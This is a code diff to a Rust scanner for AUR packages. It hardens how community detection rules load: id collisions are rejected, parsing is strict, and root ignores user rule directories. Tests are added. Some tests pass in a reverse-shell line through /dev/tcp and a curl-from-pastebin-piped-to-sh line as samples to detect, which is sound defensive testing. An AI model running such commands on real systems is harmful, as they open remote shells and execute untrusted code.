@@ -4,7 +4,7 @@ mod loader;
 
 pub use loader::RuleLoader;
 
-use crate::error::Result;
+use crate::error::{Result, ScanError};
 use crate::resolve::resolve_variables;
 use crate::textutil::{
     deobfuscate, logical_lines, CMD_START, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
@@ -12,12 +12,13 @@ use crate::textutil::{
 use crate::types::{Category, FileType, Severity};
 use regex::{Regex, RegexBuilder};
 use serde::Deserialize;
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::path::Path;
 
 /// A security detection rule (pattern-based). Community rule files use this
 /// shape; `file_types`/`patterns` default to empty so a rule file is concise.
 #[derive(Debug, Clone, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct Rule {
     /// Unique identifier (e.g., "DLE-001")
     pub id: String,
@@ -68,7 +69,7 @@ fn default_file_types() -> Vec<FileType> {
 
 /// Pattern type for matching
 #[derive(Debug, Clone, Deserialize)]
-#[serde(tag = "type", rename_all = "snake_case")]
+#[serde(tag = "type", rename_all = "snake_case", deny_unknown_fields)]
 pub enum Pattern {
     /// Regular expression pattern
     Regex { pattern: String },
@@ -212,22 +213,50 @@ impl RuleEngine {
         }
     }
 
-    /// Load rules from a directory containing TOML files
+    /// Load rules from a directory containing TOML files.
+    ///
+    /// Every candidate is vetted before it is added: a rule whose id collides
+    /// with a built-in, an analyzer code, or an earlier-loaded rule is rejected
+    /// with a stderr warning (a user-writable rules directory must never be able
+    /// to replace or lower a built-in detection), and a rule that does not
+    /// compile or has no patterns is skipped. One bad rule or file never
+    /// aborts the rest of the directory.
     pub fn load_rules_from_dir(&mut self, dir: &Path) -> Result<()> {
         let loader = RuleLoader::new();
-        let rules = loader.load_from_directory(dir)?;
+        let mut reserved = reserved_rule_ids();
+        reserved.extend(self.rules_by_id.keys().cloned());
+        let rules = loader.load_vetted_from_directory(dir, &mut reserved)?;
 
         for rule in rules {
-            self.add_rule(rule)?;
+            let id = rule.id.clone();
+            if let Err(e) = self.add_rule(rule) {
+                warn_rule(&format!("skipping rule {id} from {}: {e}", dir.display()));
+            }
         }
 
         Ok(())
     }
 
-    /// Add a single rule to the engine
+    /// Add a single rule to the engine.
+    ///
+    /// Fails if a rule with the same id is already loaded: the first definition
+    /// (built-ins are loaded first) always wins, so nothing can replace or
+    /// lower an existing detection by re-using its id.
     pub fn add_rule(&mut self, rule: Rule) -> Result<()> {
+        if self.rules_by_id.contains_key(&rule.id) {
+            return Err(ScanError::Config(format!(
+                "duplicate rule id {}: an earlier rule with this id is already loaded",
+                rule.id
+            )));
+        }
         if !rule.enabled {
             return Ok(());
+        }
+        if rule.patterns.is_empty() {
+            return Err(ScanError::Config(format!(
+                "rule {} has no patterns and could never fire",
+                rule.id
+            )));
         }
 
         let mut compiled_patterns = Vec::new();
@@ -240,8 +269,19 @@ impl RuleEngine {
             compiled_patterns,
         };
 
-        // Index by file type
-        for file_type in &rule.file_types {
+        // Index by file type. Local sidecar scripts (`FileType::SourceFile`) run
+        // inside build()/package() just like the PKGBUILD body, so every rule
+        // that applies to the PKGBUILD also applies to them.
+        let mut types: Vec<FileType> = Vec::new();
+        for ft in &rule.file_types {
+            if !types.contains(ft) {
+                types.push(*ft);
+            }
+        }
+        if types.contains(&FileType::Pkgbuild) && !types.contains(&FileType::SourceFile) {
+            types.push(FileType::SourceFile);
+        }
+        for file_type in &types {
             self.rules_by_type
                 .entry(*file_type)
                 .or_default()
@@ -330,10 +370,13 @@ impl RuleEngine {
                     continue;
                 }
 
-                for pattern in &compiled.compiled_patterns {
+                // Report each (rule, line) at most once, however many of the
+                // rule's patterns (or text variants) hit it: a rule with two
+                // patterns matching one line must not double its count.
+                'patterns: for pattern in &compiled.compiled_patterns {
                     // Try the raw line, then its de-obfuscated form, then its
                     // variable-resolved form. Each variant is matched independently
-                    // and can only ADD a finding; the first hit per pattern wins.
+                    // and can only ADD a finding; the first hit per line wins.
                     if let Some(m) = self.match_pattern(pattern, line, &compiled.rule) {
                         matches.push(RuleMatch {
                             rule_id: compiled.rule.id.clone(),
@@ -342,7 +385,7 @@ impl RuleEngine {
                             matched_text: m.1,
                             context: line.clone(),
                         });
-                        continue;
+                        break 'patterns;
                     }
                     // Raw line didn't match, but its de-obfuscated form might.
                     if let Some(decoded) = &deobf[idx] {
@@ -354,7 +397,7 @@ impl RuleEngine {
                                 matched_text: m.1,
                                 context: format!("{line}    [de-obfuscated → {decoded}]"),
                             });
-                            continue;
+                            break 'patterns;
                         }
                     }
                     // …or its variable-resolved form (a command hidden behind `$x`).
@@ -368,6 +411,7 @@ impl RuleEngine {
                                 matched_text: m.1,
                                 context: format!("{line}    [resolved → {resolved_line}]"),
                             });
+                            break 'patterns;
                         }
                     }
                 }
@@ -436,14 +480,73 @@ impl Default for RuleEngine {
     }
 }
 
+/// Print a loud, stable-prefixed rule-loading warning to stderr (never stdout:
+/// stdout carries machine-readable output).
+pub(crate) fn warn_rule(msg: &str) {
+    eprintln!("aur-scan: warning: {msg}");
+}
+
+/// Ids a community rule may never take: every built-in rule and every
+/// analyzer-owned code. A rule re-using one of these would shadow or lower it.
+pub fn reserved_rule_ids() -> HashSet<String> {
+    let mut ids: HashSet<String> = get_builtin_rules().into_iter().map(|r| r.id).collect();
+    ids.extend(crate::catalog::analyzer_codes().into_iter().map(|e| e.id));
+    ids
+}
+
+/// Load, vet and return every community rule from `dirs`, in order, rejecting
+/// id collisions with built-ins, analyzer codes and earlier rules. This is the
+/// single loader shared by the scan engine and the `codes` catalog, so the
+/// catalog lists exactly the rules that will really run.
+pub fn load_community_rules<I: IntoIterator<Item = std::path::PathBuf>>(dirs: I) -> Vec<Rule> {
+    let loader = RuleLoader::new();
+    let mut reserved = reserved_rule_ids();
+    let mut out = Vec::new();
+    for dir in dirs {
+        if !dir.is_dir() {
+            continue;
+        }
+        match loader.load_vetted_from_directory(&dir, &mut reserved) {
+            Ok(rules) => out.extend(rules),
+            Err(e) => warn_rule(&format!(
+                "failed to read community rules from {}: {e}",
+                dir.display()
+            )),
+        }
+    }
+    out
+}
+
+/// True when this process runs with root's effective uid. Uses the owner of
+/// `/proc/self` (the process's effective uid) so no libc dependency is needed;
+/// if that cannot be determined it fails safe and reports privileged.
+pub(crate) fn running_as_root() -> bool {
+    use std::os::unix::fs::MetadataExt;
+    std::fs::metadata("/proc/self")
+        .map(|m| m.uid() == 0)
+        .unwrap_or(true)
+}
+
 /// Standard directories users/distros can drop community rule TOML files into.
+///
+/// A root process (the pacman hook) reads only the root-owned system
+/// directories: the per-user config dir is writable by any earlier package's
+/// `build()`, and must never feed rules to a privileged scanner (same policy as
+/// `ScanConfig::resolve_for_privilege`).
 pub fn user_rule_dirs() -> Vec<std::path::PathBuf> {
+    user_rule_dirs_for(running_as_root())
+}
+
+/// [`user_rule_dirs`] with the privilege decision supplied by the caller.
+pub fn user_rule_dirs_for(privileged: bool) -> Vec<std::path::PathBuf> {
     let mut dirs = vec![
         std::path::PathBuf::from("/usr/share/aur-scanner/rules.d"),
         std::path::PathBuf::from("/etc/aur-scanner/rules.d"),
     ];
-    if let Some(cfg) = dirs::config_dir() {
-        dirs.push(cfg.join("aur-scanner/rules.d"));
+    if !privileged {
+        if let Some(cfg) = dirs::config_dir() {
+            dirs.push(cfg.join("aur-scanner/rules.d"));
+        }
     }
     dirs
 }
@@ -3499,5 +3602,179 @@ mod tests {
                 "SHELL-002 borrowed a flag across a separator: {s} -> {m:?}"
             );
         }
+    }
+
+    // ---- community rule loading: collisions, privilege, bad input ----
+
+    fn write_rule(dir: &Path, file: &str, body: &str) {
+        std::fs::write(dir.join(file), body).unwrap();
+    }
+
+    const OK_RULE: &str = r#"
+[[rule]]
+id = "COMM-001"
+name = "n"
+description = "d"
+severity = "high"
+category = "malicious_code"
+recommendation = "r"
+[[rule.patterns]]
+type = "regex"
+pattern = "zzzmarker"
+"#;
+
+    #[test]
+    fn community_rule_cannot_shadow_or_lower_a_builtin() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "evil.toml",
+            r#"
+[[rule]]
+id = "SHELL-001"
+name = "lowered"
+description = "d"
+severity = "info"
+category = "malicious_code"
+recommendation = "r"
+[[rule.patterns]]
+type = "regex"
+pattern = "neverMatchesAnything12345"
+"#,
+        );
+        let mut engine = RuleEngine::default();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        let rule = engine.get_rule("SHELL-001").unwrap();
+        assert_eq!(rule.severity, Severity::Critical, "builtin was lowered");
+        assert_ne!(rule.name, "lowered");
+        let m = engine.match_content("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", FileType::Pkgbuild);
+        assert!(m.iter().any(|x| x.rule_id == "SHELL-001"));
+    }
+
+    #[test]
+    fn add_rule_rejects_duplicate_id() {
+        let mut engine = RuleEngine::default();
+        let mut dup = get_builtin_rules().remove(0);
+        dup.severity = Severity::Info;
+        assert!(engine.add_rule(dup).is_err());
+    }
+
+    #[test]
+    fn catalog_and_engine_share_the_vetting_loader() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "a.toml",
+            &OK_RULE.replace("COMM-001", "SHELL-001"),
+        );
+        write_rule(dir.path(), "b.toml", OK_RULE);
+        let cat = crate::catalog::Catalog::load_with(&[dir.path().to_path_buf()]);
+        assert_eq!(cat.validate(), Ok(()));
+        assert!(cat.get("COMM-001").is_some());
+        assert_eq!(cat.get("SHELL-001").unwrap().owner, "rules");
+    }
+
+    #[test]
+    fn user_rule_dirs_for_root_excludes_user_config() {
+        let root = user_rule_dirs_for(true);
+        assert_eq!(root.len(), 2);
+        assert!(root
+            .iter()
+            .all(|p| p.starts_with("/usr") || p.starts_with("/etc")));
+        assert!(user_rule_dirs_for(false).len() >= root.len());
+    }
+
+    #[test]
+    fn bad_regex_skips_only_its_own_rule() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "a_bad.toml",
+            &OK_RULE
+                .replace("COMM-001", "COMM-BAD")
+                .replace("zzzmarker", "(unclosed"),
+        );
+        write_rule(dir.path(), "b_good.toml", OK_RULE);
+        let mut engine = RuleEngine::new();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        assert!(engine.get_rule("COMM-BAD").is_none());
+        assert!(engine.get_rule("COMM-001").is_some());
+    }
+
+    #[test]
+    fn unknown_keys_skip_the_file() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "typo.toml",
+            &OK_RULE
+                .replace("COMM-001", "COMM-TYPO")
+                .replace("[[rule.patterns]]", "[[rule.patern]]"),
+        );
+        write_rule(
+            dir.path(),
+            "ft.toml",
+            &OK_RULE
+                .replace("COMM-001", "COMM-FT")
+                .replace("severity", "file_type = \"pkgbuild\"\nseverity"),
+        );
+        write_rule(dir.path(), "ok.toml", OK_RULE);
+        let mut engine = RuleEngine::new();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        assert!(engine.get_rule("COMM-TYPO").is_none());
+        assert!(engine.get_rule("COMM-FT").is_none());
+        assert!(engine.get_rule("COMM-001").is_some());
+    }
+
+    #[test]
+    fn rule_with_no_patterns_is_rejected() {
+        let dir = tempfile::tempdir().unwrap();
+        let no_pat = OK_RULE.replace("COMM-001", "COMM-EMPTY").replace(
+            "[[rule.patterns]]\ntype = \"regex\"\npattern = \"zzzmarker\"\n",
+            "",
+        );
+        write_rule(dir.path(), "e.toml", &no_pat);
+        let mut engine = RuleEngine::new();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        assert!(engine.get_rule("COMM-EMPTY").is_none());
+    }
+
+    #[test]
+    fn source_file_rules_fire_on_sidecars_and_pkgbuild_rules_apply_too() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "sf.toml",
+            &OK_RULE.replace("severity", "file_types = [\"source_file\"]\nseverity"),
+        );
+        let mut engine = RuleEngine::default();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        let m = engine.match_content("run zzzmarker", FileType::SourceFile);
+        assert!(m.iter().any(|x| x.rule_id == "COMM-001"));
+        // A built-in PKGBUILD rule also covers sidecars.
+        let m = engine.match_content(
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            FileType::SourceFile,
+        );
+        assert!(m.iter().any(|x| x.rule_id == "SHELL-001"));
+    }
+
+    #[test]
+    fn two_patterns_on_one_line_report_once() {
+        let engine = RuleEngine::default();
+        let line = "curl https://pastebin.com/raw/abc | sh";
+        let m = engine.match_content(line, FileType::Pkgbuild);
+        let n = m.iter().filter(|x| x.rule_id == "PASTE-001").count();
+        assert_eq!(n, 1, "PASTE-001 reported {n}x for one line: {m:?}");
+    }
+
+    #[test]
+    fn shipped_example_rules_still_load_under_strict_parsing() {
+        // The strict (deny_unknown_fields) loader must not reject the example
+        // rule file we ship for authors to copy.
+        let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../install/rules.d");
+        let mut engine = RuleEngine::new();
+        engine.load_rules_from_dir(&dir).unwrap();
+        assert!(engine.get_rule("EXAMPLE-001").is_some());
     }
 }
